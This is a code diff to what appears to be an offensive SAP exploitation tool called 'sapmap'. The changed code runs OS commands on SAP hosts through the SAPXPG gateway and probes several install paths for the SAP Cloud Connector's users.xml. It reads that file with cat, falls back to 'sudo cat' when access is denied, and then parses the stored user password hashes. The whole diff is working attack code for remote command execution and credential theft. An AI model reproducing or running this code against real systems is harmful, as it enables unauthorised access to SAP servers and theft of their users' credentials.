@@ -1829,10 +1829,16 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 continue
             print(f"[*] SCC {host}: Path 1 — trying OS-exec via {n.sid}")
             try:
-                from sapmap_exploit import run_os_command
-                # SAPXPG splits PARAMS on spaces at the OS level — the args
-                # never reach a shell, so /bin/sh -c "..." always breaks.
-                # Call ls and cat directly with a plain path argument.
+                # Use execute_gw_command directly with long_params="" to
+                # prevent the default PARAMS-mirroring into LONG_PARAMS.
+                # With long_params=None (run_os_command default), the kernel
+                # concatenates PARAMS+LONG_PARAMS, turning "cat /path" into
+                # "cat /path /path" and returning the file content twice.
+                from sapmap_exploit import execute_gw_command
+                def _gw(prog, arg):
+                    r = execute_gw_command(n, prog, arg, long_params="")
+                    return "\n".join(r.get("output") or []).strip(), r.get("success", False)
+
                 scc_roots = [
                     "/opt/sap/scc",
                     "/usr/local/scc",
@@ -1840,49 +1846,33 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     "/opt/cloud-connector",
                     "/opt/SAP/cloud-connector",
                 ]
-                # For each candidate path: ls tells us existence; cat reads.
-                # ls prints just the path on success, or an error containing
-                # the path on failure — use startswith to avoid false positives.
-                # Permission denied on cat means SAPXPG subprocess lost the
-                # scc supplementary group; fall back to sudo cat.
                 fpath = None
                 for root in scc_roots:
                     candidate = f"{root}/config/users.xml"
-                    r_ls = run_os_command(n, "ls", candidate)
-                    ls_out = "\n".join(r_ls.get("output") or []).strip()
+                    ls_out, _ = _gw("ls", candidate)
                     ls_ok = ls_out.startswith(candidate) and \
                             "Permission denied" not in ls_out and \
                             "No such file" not in ls_out
                     print(f"[*] SCC {host}: ls {candidate} → "
                           f"ok={ls_ok} out={ls_out[:60]!r}")
-                    if ls_ok:
+                    if ls_ok or "Permission denied" in ls_out:
                         fpath = candidate
-                        break
-                    # ls permission denied means dir exists but SAPXPG lacks
-                    # group access — still try cat (different code path)
-                    if "Permission denied" in ls_out:
-                        print(f"[*] SCC {host}: ls permission denied on "
-                              f"{candidate} — will try cat anyway")
-                        fpath = candidate
+                        if "Permission denied" in ls_out:
+                            print(f"[*] SCC {host}: ls permission denied — "
+                                  f"will try cat anyway")
                         break
                 if not fpath:
                     print(f"[-] SCC {host}: users.xml not found via "
                           f"{n.sid} (checked {len(scc_roots)} paths)")
                     continue
 
-                def _try_cat(cmd, arg):
-                    r = run_os_command(n, cmd, arg)
-                    return "\n".join(r.get("output") or [])
-
-                content = _try_cat("cat", fpath)
+                content, _ = _gw("cat", fpath)
                 print(f"[*] SCC {host}: cat output ({len(content)} chars): "
                       f"{content[:80]!r}")
                 if "Permission denied" in content:
-                    # SAPXPG subprocess dropped scc supplementary group.
-                    # Try sudo cat — works when s4hadm has passwordless sudo.
                     print(f"[*] SCC {host}: cat permission denied — "
                           f"trying sudo cat")
-                    content = _try_cat("sudo", f"cat {fpath}")
+                    content, _ = _gw("sudo", f"cat {fpath}")
                     print(f"[*] SCC {host}: sudo cat ({len(content)} chars): "
                           f"{content[:80]!r}")
                 if content.strip().startswith("<"):
@@ -1986,10 +1976,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"ok": False, "error": diag})
 
         # --- Parse XML ---------------------------------------------------
-        print(f"[*] SCC {host}: xml_bytes ({len(xml_bytes)}B) full hex:\n"
-              f"{xml_bytes.hex()}")
-        for i, line in enumerate(xml_bytes.split(b'\n'), 1):
-            print(f"  L{i:02d} ({len(line)}B): {line!r}")
+        print(f"[*] SCC {host}: xml_bytes ({len(xml_bytes)}B) first 200: "
+              f"{xml_bytes[:200]!r}")
         from sapmap_scc_keystore import parse_user_hashes_from_xml
         result = parse_user_hashes_from_xml(xml_bytes)
         if not result.get("ok"):
